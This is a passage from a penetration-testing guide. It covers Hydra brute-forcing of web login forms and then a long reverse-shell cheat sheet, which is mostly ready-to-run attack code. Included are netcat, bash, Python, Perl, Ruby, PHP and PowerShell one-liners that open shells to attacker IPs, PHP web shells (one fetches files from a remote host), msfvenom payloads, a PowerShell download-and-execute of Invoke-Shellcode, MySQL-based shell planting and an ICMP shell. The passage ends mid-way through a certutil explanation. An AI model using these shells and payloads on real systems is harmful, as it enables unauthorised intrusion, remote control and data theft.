<section id="brute-forcing-hydra">
<h4>Brute forcing: hydra<a class="headerlink" href="#brute-forcing-hydra" title="Link to this heading"></a></h4>
<p>Hydra can be used to brute force login web pages</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">-l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE  (userlist)</span>
<span class="go">-p PASS  or -P FILE try password PASS, or load several passwords from FILE  (passwordlist)</span>
<span class="go">-U        service module usage details</span>
<span class="go">-e nsr additional checks, &quot;n&quot; for null password, &quot;s&quot; try login as pass, &quot;r&quot; try the reverse login as pass</span>
</pre></div>
</div>
<p>hydra http-post-form:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">hydra -U http-post-form</span>
</pre></div>
</div>
<section id="help-for-module-http-post-form">
<h5>Help for module http-post-form<a class="headerlink" href="#help-for-module-http-post-form" title="Link to this heading"></a></h5>
<p>Module http-post-form requires the page and the parameters for the web form.</p>
<p>The parameters take three “:” separated values, plus optional values.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]</span>
</pre></div>
</div>
<ul class="simple">
<li><p>First is the page on the server to send a GET or POST request to (URL).</p></li>
<li><p>Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced with the “^USER^” and “^PASS^” placeholders (FORM PARAMETERS)</p></li>
<li><p>Third is the string that it checks for an <em>invalid</em> login (by default). Invalid condition login check can be preceded by “F=”, successful condition login check must be preceded by “S=”. This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!</p></li>
<li><p>The following parameters are optional:
C=/page/uri          to define a different page to gather initial cookies from
(h|H)=My-Hdr: foo   to send a user defined HTTP header with each request ^USER^ and ^PASS^ can also be put into these headers!</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>Note:</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>‘h’ will add the user-defined header at the end regardless it’s already being sent by Hydra or not.</p></li>
<li><p>‘H’ will replace the value of that header if it exists, by the one supplied by the user, or add the header at the end</p></li>
</ul>
</div></blockquote>
<ul class="simple">
<li><p>Note that if you are going to put colons (:) in your headers you should escape them with a backslash (). All colons that are not option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.</p></li>
</ul>
</div></blockquote>
<p>Examples:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&quot;/login.php:user=^USER^&amp;pass=^PASS^:incorrect&quot;</span>
<span class="go">&quot;/login.php:user=^USER^&amp;pass=^PASS^&amp;colon=colon\:escape:S=authlog=.*success&quot;</span>
<span class="go">&quot;/login.php:user=^USER^&amp;pass=^PASS^&amp;mid=123:authlog=.*failed&quot;</span>
<span class="go">&quot;/:user=^USER&amp;pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^&quot;</span>
<span class="go">&quot;/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F&lt;target&gt;%2Fexchange&amp;flags=0&amp;username=&lt;domain&gt;%5C^USER^&amp;password=^PASS^&amp;SubmitCreds=x&amp;trusted=0:reason=:C=/exchweb&quot;</span>
</pre></div>
</div>
<div class="admonition-todo admonition" id="id3">
<p class="admonition-title">Todo</p>
<p>Add a program/binary that an easier syntax, ncrack maybe? Elaborate on the examples, eg. what they will do once executed?</p>
</div>
</section>
</section>
</section>
</section>
<section id="reverse-shells">
<h2>Reverse Shells<a class="headerlink" href="#reverse-shells" title="Link to this heading"></a></h2>
<p>Once we have figured out some vulnerability or misconfiguration in a running service which allows us to make a connection back to our attack machine, we would like to set up a reverse shell. This can be done through version methods e.g. by using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. The section below has been mostly adapted from <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a>  and <a class="reference external" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a> and more.</p>
<section id="netcat-nc">
<h3>netcat (nc)<a class="headerlink" href="#netcat-nc" title="Link to this heading"></a></h3>
<section id="tcp-mode">
<h4>TCP Mode<a class="headerlink" href="#tcp-mode" title="Link to this heading"></a></h4>
<section id="with-the-e-option">
<h5>with the -e option<a class="headerlink" href="#with-the-e-option" title="Link to this heading"></a></h5>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nc -e /bin/sh 10.1.1.1 4444</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="without-e-option">
<h5>without -e option<a class="headerlink" href="#without-e-option" title="Link to this heading"></a></h5>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span>
</pre></div>
</div>
</div></blockquote>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>f in this case is a file name, if you want to have more then one reverse shell with this method you will have to use another letter (a … z) then the one you used intially.</p>
</div>
</section>
</section>
<section id="udp-mode">
<h4>UDP Mode<a class="headerlink" href="#udp-mode" title="Link to this heading"></a></h4>
<p>Just use the UDP Mode (-u)</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nc -h</span>
<span class="go">[v1.10-41.1]</span>
<span class="go">connect to somewhere:  nc [-options] hostname port[s] [ports] ...</span>
<span class="go">listen for inbound:    nc -l -p port [-options] [hostname] [port]</span>
<span class="go">options:</span>
<span class="go">       -l                      listen mode, for inbound connects</span>
<span class="go">       -n                      numeric-only IP addresses, no DNS</span>
<span class="go">       -p port                 local port number</span>
<span class="go">       -u                      UDP mode</span>
</pre></div>
</div>
</section>
</section>
<section id="php">
<h3>PHP<a class="headerlink" href="#php" title="Link to this heading"></a></h3>
<section id="php-web-shell">
<h4>PHP Web Shell<a class="headerlink" href="#php-web-shell" title="Link to this heading"></a></h4>
<blockquote>
<div><p>This is a kind of Web shell and not a reverse shell.</p>
<p>We can create a new file say (shell.php) on the server containing</p>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</pre></div>
</div>
<p>which can then be accessed by</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://IP/shell.php?cmd=id</span>
</pre></div>
</div>
<p>If there’s a webpage which accepts phpcode to be executed, we can use curl to urlencode the payload and run it.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl -G -s http://10.X.X.X/somepage.php?data= --data-urlencode &quot;html=&lt;?php passthru(&#39;ls -lah&#39;); ?&gt;&quot; -b &quot;somecookie=somevalue&quot; | sed &#39;/&lt;html&gt;/,/&lt;\/html&gt;/d&#39;</span>

<span class="go">-G When used, this option will make all data specified with -d, --data, --data-binary or --data-urlencode to be used in an HTTP GET request instead of the POST request that otherwise would be used. The data will be appended to the URL with a  &#39;?&#39; separator.</span>
<span class="go">-data-urlencode &lt;data&gt; (HTTP) Posts data, similar to the other -d, --data options with the exception that this performs URL-encoding.</span>
<span class="go">-b, --cookie &lt;data&gt; (HTTP) Passes the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a &quot;Set-Cookie:&quot; line.  The data should be in the format &quot;NAME1=VALUE1; NAME2=VALUE2&quot;.</span>
</pre></div>
</div>
<p>The sed command in the end</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sed &#39;/&lt;html&gt;/,/&lt;\/html&gt;/d&#39;</span>
</pre></div>
</div>
<p>deletes the content between &lt;html&gt; and &lt;/html&gt; tag.</p>
<p>If you also want to provide upload functionality (imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&lt;?php</span>
<span class="go"> if (isset($_REQUEST[&#39;fupload&#39;])) {</span>
<span class="go">  file_put_contents($_REQUEST[&#39;fupload&#39;], file_get_contents(&quot;http://yourIP/&quot; . $_REQUEST[&#39;fupload&#39;]));</span>
<span class="go"> };</span>
<span class="go"> if (isset($_REQUEST[&#39;cmd&#39;])) {</span>
<span class="go">  echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST[&#39;cmd&#39;]) . &quot;&lt;/pre&gt;&quot;;</span>
<span class="go"> }</span>
<span class="go">?&gt;</span>
</pre></div>
</div>
<p>The above can be accessed by</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://IP/shell.php?fupload=filename_on_your_webserver</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="php-meterpreter">
<h4>PHP Meterpreter<a class="headerlink" href="#php-meterpreter" title="Link to this heading"></a></h4>
<blockquote>
<div><p>We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php</span>
</pre></div>
</div>
<p>We can set the multi-handler in metasploit by</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use exploit/multi/handler</span>
<span class="go">set payload php/meterpreter/reverse_tcp</span>
<span class="go">set LHOST yourIP</span>
<span class="go">run</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="php-reverse-shell">
<h4>PHP Reverse Shell<a class="headerlink" href="#php-reverse-shell" title="Link to this heading"></a></h4>
<blockquote>
<div><p>The code below assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4 or 5 or 6.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">php -r &#39;$sock=fsockopen(&quot;192.168.56.101&quot;,1337);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
</pre></div>
</div>
<p>The above can be connected to by listening on port 1337 by using nc.</p>
</div></blockquote>
</section>
</section>
<section id="weevely">
<h3>Weevely<a class="headerlink" href="#weevely" title="Link to this heading"></a></h3>
<p>Weevely also generates a webshell</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">weevely generate password /tmp/payload.php</span>
</pre></div>
</div>
<p>which can then be called by</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">weevely http://192.168.1.2/location_of_payload password</span>
</pre></div>
</div>
<p>However, it was not as useful as php meterpreter or a reverse shell.</p>
<div class="admonition-todo admonition" id="id4">
<p class="admonition-title">Todo</p>
<p>Elobrate -&gt; why wasn’t it useful? iirc (really not sure) if you don’t provide a password it will ask for it</p>
</div>
</section>
<section id="ruby">
<h3>Ruby<a class="headerlink" href="#ruby" title="Link to this heading"></a></h3>
<div class="highlight-ruby notranslate"><div class="highlight"><pre><span></span><span class="n">ruby</span><span class="w"> </span><span class="o">-</span><span class="n">rsocket</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="s1">&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span>
</pre></div>
</div>
</section>
<section id="perl">
<h3>Perl<a class="headerlink" href="#perl" title="Link to this heading"></a></h3>
<div class="highlight-perl notranslate"><div class="highlight"><pre><span></span><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
</pre></div>
</div>
</section>
<section id="python">
<h3>Python<a class="headerlink" href="#python" title="Link to this heading"></a></h3>
<section id="tcp">
<h4>TCP<a class="headerlink" href="#tcp" title="Link to this heading"></a></h4>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
</pre></div>
</div>
</section>
<section id="udp">
<h4>UDP<a class="headerlink" href="#udp" title="Link to this heading"></a></h4>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">pty</span><span class="o">,</span><span class="nn">socket</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.10.14.17&quot;</span><span class="p">,</span> <span class="mi">4445</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">putenv</span><span class="p">(</span><span class="s2">&quot;HISTFILE&quot;</span><span class="p">,</span><span class="s1">&#39;/dev/null&#39;</span><span class="p">);</span><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
</div>
</section>
</section>
<section id="java">
<h3>Java<a class="headerlink" href="#java" title="Link to this heading"></a></h3>
<div class="highlight-java notranslate"><div class="highlight"><pre><span></span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">()</span>
<span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="o">[</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="s">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">()</span>
</pre></div>
</div>
</section>
<section id="jsp">
<h3>JSP<a class="headerlink" href="#jsp" title="Link to this heading"></a></h3>
<div class="highlight-jsp notranslate"><div class="highlight"><pre><span></span>msfvenom<span class="w"> </span>-p<span class="w"> </span>java/jsp_shell_reverse_tcp<span class="w"> </span>LHOST=192.168.110.129<span class="w"> </span>LPORT=4444<span class="w"> </span>-f<span class="w"> </span>war<span class="w"> </span>&gt;<span class="w"> </span>runme.war
</pre></div>
</div>
</section>
<section id="bash-dev-tcp">
<h3>Bash /dev/tcp<a class="headerlink" href="#bash-dev-tcp" title="Link to this heading"></a></h3>
<p>If a server (attacker machine) is listening on a port:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nc -lvp port</span>
</pre></div>
</div>
<p>then we can use the below to connect</p>
<section id="method-1">
<h4>Method 1<a class="headerlink" href="#method-1" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">/bin/bash -i &gt;&amp;/dev/tcp/IP/Port 0&gt;&amp;1</span>
</pre></div>
</div>
</section>
<section id="method-2">
<h4>Method 2<a class="headerlink" href="#method-2" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">exec 5&lt;&gt;/dev/tcp/IP/80</span>
<span class="go">cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span>

<span class="gp"># </span>or:

<span class="go">while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span>
</pre></div>
</div>
</section>
<section id="method-3">
<h4>Method 3<a class="headerlink" href="#method-3" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/IP/Port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span>

<span class="go">-- We may execute the above using bash -c &quot;Aboveline &quot;</span>
</pre></div>
</div>
<p><a class="reference external" href="http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip">Information about Bash Built-in /dev/tcp File (TCP/IP)</a></p>
<p>The following script fetches the front page from Google:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">exec 3&lt;&gt;/dev/tcp/www.google.com/80</span>
<span class="go">echo -e &quot;GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n&quot; &gt;&amp;3</span>
<span class="go">cat &lt;&amp;3</span>
</pre></div>
</div>
<ul class="simple">
<li><p>The first line causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket. This is a special form of the exec statement. From the bash man page:</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">exec [-cl] [-a name] [command [arguments]]</span>
</pre></div>
</div>
<p>If command is not specified, any redirections take effect in the current shell, and the return status is 0. So using exec without a command is a way to open files in the current shell.</p>
</div></blockquote>
<ul class="simple">
<li><p>Second line:  After the socket is open we send our HTTP request out the socket with the echo … &gt;&amp;3 command. The request consists of:</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">GET / HTTP/1.1</span>
<span class="go">host: http://www.google.com</span>
<span class="go">Connection: close</span>
</pre></div>
</div>
<p>Each line is followed by a carriage-return and newline, and all the headers are followed by a blank line to signal the end of the request (this is all standard HTTP stuff).</p>
</div></blockquote>
<ul class="simple">
<li><p>Third line: Next we read the response out of the socket using cat &lt;&amp;3, which reads the response and prints it out.</p></li>
</ul>
</section>
</section>
<section id="telnet-reverse-shell">
<h3>Telnet Reverse Shell<a class="headerlink" href="#telnet-reverse-shell" title="Link to this heading"></a></h3>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p</span>

<span class="go">telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443</span>
</pre></div>
</div>
<div class="admonition-todo admonition" id="id5">
<p class="admonition-title">Todo</p>
<p>explain the example above</p>
</div>
</section>
<section id="xterm">
<h3>XTerm<a class="headerlink" href="#xterm" title="Link to this heading"></a></h3>
<p>One of the simplest forms of reverse shell is an xterm session. The following command should be run on the victim server. It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>xterm<span class="w"> </span>-display<span class="w"> </span><span class="m">10</span>.0.0.1:1
</pre></div>
</div>
<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Xnest :1 -listen tcp</span>
</pre></div>
</div>
<p>You’ll need to authorize the target to connect to you (command also run on your host):</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">xhost +targetip</span>
</pre></div>
</div>
</section>
<section id="lynx">
<h3>Lynx<a class="headerlink" href="#lynx" title="Link to this heading"></a></h3>
<p>Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs.
This is a big security hole for sites that use lynx “guest accounts” and other public services. More details <a class="reference external" href="http://insecure.org/sploits/lynx.download.html">LynxShell</a></p>
<p>When you start up a lynx client session, you can hit “g” (for goto) and then enter the following URL:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">URL to open: LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null</span>
</pre></div>
</div>
</section>
<section id="mysql">
<h3>MYSQL<a class="headerlink" href="#mysql" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p>If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">echo -n &quot;&lt;?php phpinfo(); ?&gt;&quot; | xxd -ps 3c3f70687020706870696e666f28293b203f3e</span>

<span class="go">select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html/blogblog/wp-content/uploads/phpinfo.php&quot;</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">SELECT &quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; into dumpfile &#39;/var/www/html/shell.php&#39;;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>If you have sql-shell from sqlmap/ phpmyadmin, we can read files by using the load_file function.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">select load_file(&#39;/etc/passwd&#39;);</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="reverse-shell-from-windows">
<h3>Reverse Shell from Windows<a class="headerlink" href="#reverse-shell-from-windows" title="Link to this heading"></a></h3>
<p>If there’s a way, we can execute code from windows, we may try</p>
<ul class="simple">
<li><p>Uploading ncat and executing it</p></li>
<li><p>Powershell Empire/ Metasploit Web-Delivery Method</p></li>
<li><p>Invoke-Shellcode (from powersploit)</p></li>
</ul>
<blockquote>
<div><div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">Powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-NoP</span> <span class="n">-NonI</span> <span class="n">-W</span> <span class="n">Hidden</span> <span class="n">-Exec</span> <span class="n">Bypass</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://YourIPAddress:8000/Invoke-Shellcode.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-Shellcode</span> <span class="n">-Payload</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_https</span> <span class="n">-Lhost</span> <span class="n">YourIPAddress</span> <span class="n">-Lport</span> <span class="n">4444</span> <span class="n">-Force</span><span class="s2">&quot;</span>
</pre></div>
</div>
</div></blockquote>
<div class="admonition-todo admonition" id="id6">
<p class="admonition-title">Todo</p>
<p>add Nishang?</p>
</div>
</section>
<section id="msf-meterpreter-elf">
<h3>MSF Meterpreter ELF<a class="headerlink" href="#msf-meterpreter-elf" title="Link to this heading"></a></h3>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.XX.110 LPORT=4446</span>
</pre></div>
</div>
</section>
<section id="metasploit-msfvenom">
<h3>Metasploit MSFVenom<a class="headerlink" href="#metasploit-msfvenom" title="Link to this heading"></a></h3>
<p>Ever wondered from where the above shells came from? Maybe try msfvenom and grep for cmd/unix</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -l payloads | grep &quot;cmd/unix&quot;</span>
<span class="go">**snip**</span>
<span class="go">   cmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK</span>
<span class="go">   cmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)</span>
<span class="go">   cmd/unix/bind_lua                                   Listen for a connection and spawn a command shell via Lua</span>
<span class="go">   cmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat</span>
<span class="go">   cmd/unix/bind_perl                                  Listen for a connection and spawn a command shell via perl</span>
<span class="go">   cmd/unix/interact                                   Interacts with a shell on an established socket connection</span>
<span class="go">   cmd/unix/reverse                                    Creates an interactive shell through two inbound connections</span>
<span class="go">   cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK</span>
<span class="go">   cmd/unix/reverse_python                             Connect back and create a command shell via Python</span>
<span class="go">   cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.</span>
<span class="go">   cmd/unix/reverse_r                                  Connect back and create a command shell via R</span>
<span class="go">   cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby</span>
<span class="go">**snip**</span>
</pre></div>
</div>
<p>Now, try to check the payload</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p cmd/unix/bind_netcat</span>
<span class="go">Payload size: 105 bytes</span>
<span class="go">mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0&lt;/tmp/cdniov | /bin/sh &gt;/tmp/cdniov 2&gt;&amp;1; rm /tmp/cdniov</span>
</pre></div>
</div>
</section>
<section id="icmp-shell">
<h3>ICMP Shell<a class="headerlink" href="#icmp-shell" title="Link to this heading"></a></h3>
<p>Sometimes, inbound and outbound traffic from any port is disallowed and only ICMP traffic is allowed. In that case, we can use <a class="reference external" href="https://github.com/inquisb/icmpsh">Simple reverse ICMP Shell</a> However, this requires the executable to be present on the system. There’s a powershell version of <a class="reference external" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">ICMP Reverse Shell</a> Sometimes, probably, we can execute powershell code on the machine. In that case, we can use the one-liner powershell code to execute the shell.</p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-c</span> <span class="s2">&quot;$ip=&#39;your_ip&#39;; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(&#39;OK&#39;), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(&#39;&#39;), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }&quot;</span>
</pre></div>
</div>
<p>The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won’t be displayed!). Now, there’s a painful way of transferring files to the victim system which is</p>
<ul class="simple">
<li><p>Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the unnecessary code/ comments, this would help us to reduce the length of the base64). Do make sure that your base64 when converted back is correct! Refer <a class="reference external" href="https://blogs.msdn.microsoft.com/timid/2014/03/26/powershell-encodedcommand-and-round-trips/">PowerShell –EncodedCommand and Round-Trips</a></p></li>
<li><p>Utilize the <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1">Add-Content cmdlet</a> to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Add-Content &lt;filename&gt; &quot;Base64 encoded content&quot;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Once the base64-encoded data is transferred, we can utilize <a class="reference external" href="https://technet.microsoft.com/en-us/library/cc732443(v=ws.11).aspx">certutil</a> from Microsoft to decode the base64-encoded to normal file.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">certutil &lt;-decode/ -encode&gt; &lt;input file&gt; &lt;output file&gt;</span>
<span class="go">-decode Decode a Base64-encoded file</span>
